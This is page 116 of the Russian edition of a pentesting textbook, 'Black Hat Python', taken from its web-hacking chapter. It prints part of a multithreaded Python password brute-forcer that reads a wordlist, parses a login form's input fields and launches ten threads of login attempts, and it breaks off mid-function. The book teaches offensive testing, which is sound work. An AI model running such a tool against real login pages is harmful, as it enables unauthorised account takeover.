# Black Hat Python. Программирование для хакеров и пентестеров — страница 116

Источник: `Black Hat Python. Программирование для хакеров и пентестеров.pdf`

116   Глава 5. Веб-хакерство
    for word in raw_words.split():
        words.put(word)
    return words
def get_params(content): 
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'): # находим все элементы input 
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params
Эти общие параметры заслуживают особого внимания. Переменная TAR-
GET  — это URL-адрес, с которого скрипт изначально загружает HTML для
дальнейшего разбора. Переменная SUCCESS  — это строка, которую мы будем
искать в теле ответа после каждой попытки, чтобы определить, получилось
у нас подобрать учетные данные или нет.
Функция get_words  должна выглядеть знакомо, так как ее аналог исполь-
зовался в скрипте перебора в разделе «Определение структуры каталогов
методом перебора». Функция get_params  принимает тело HTTP-ответа,
разбирает его и циклически проходится по всем элементам input , чтобы
составить словарь с параметрами, которые нам нужно заполнить. Т еперь на-
пишем основную логику нашего инструмента. Часть представленного здесь
кода должна быть вам знакома по листингам предыдущих инструментов для
перебора, поэтому остановимся только на новых приемах.
class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack beginning on {url}.\n')
        print("Finished the setup where username = %s\n" % username)
    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()
    def web_bruter(self, passwords):
        session = requests.Session() 
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
